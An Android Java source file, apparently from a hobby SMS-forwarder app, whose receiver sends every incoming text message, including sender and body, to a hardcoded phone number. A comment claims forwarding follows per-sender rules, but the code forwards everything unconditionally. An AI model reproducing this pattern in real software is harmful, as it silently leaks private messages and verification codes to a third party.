package pl.laskowski.android.smsforwarder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class SMSReceiver extends BroadcastReceiver {

	public static final String FORWARD_TEXT = "Forwarded message from : ";

	SmsManager manager = SmsManager.getDefault();

	@Override
	public void onReceive(Context context, Intent intent) {
		Bundle extras = intent.getExtras();

		Object[] pdus = (Object[]) extras.get("pdus");
		for (Object pdu : pdus) {
			SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdu);

			String origin = msg.getOriginatingAddress();
			String body = msg.getMessageBody();

			// Forward the received SMS if and only if there is a rule for sender
			// TODO implement settings
			manager.sendTextMessage("+48793236373", null, FORWARD_TEXT + origin + ":" + body, null, null);

		}
	}
}